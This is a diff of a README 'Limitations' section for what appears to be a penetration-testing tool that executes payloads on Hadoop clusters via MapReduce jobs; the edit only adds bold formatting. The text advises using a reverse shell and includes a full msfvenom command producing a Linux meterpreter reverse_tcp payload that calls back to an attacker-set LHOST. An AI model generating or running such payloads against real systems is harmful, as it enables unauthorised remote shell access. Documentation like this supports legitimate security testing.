@@ -72,11 +72,11 @@ Limitations
 Due to the **distributed nature of a MapReduce job**, it is not possible to specify on which node you want to execute your payload. There is **no mechanism** ensuring that the payload you will launch on **two successive jobs** will execute on the **same cluster member**.  
 As a consequence **you can't know beforehand the server IP where your payload will be executed**: so just use a `reverse shell` payload and **gently wait for your shell to arrive**.
 
-It is possible to use a meterpreter, for instance generated as following:
+It is possible to use a **meterpreter**, for instance generated as following:
 ```
 $ msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<IP address> -f elf -o msf.payload
 ```
-Note that on certain Hadoop clusters the meterpreter does work, the session is created, but calling the `shell` command leads to session termination for unknown reasons. In that case use a plain metasploit `reverse_shell` payload.
+Note that on certain Hadoop clusters the meterpreter does work, the session is created, **but calling the `shell` command leads to session termination for unknown reasons**. In that case use a **plain metasploit `reverse_shell` payload.**
   
   
 References
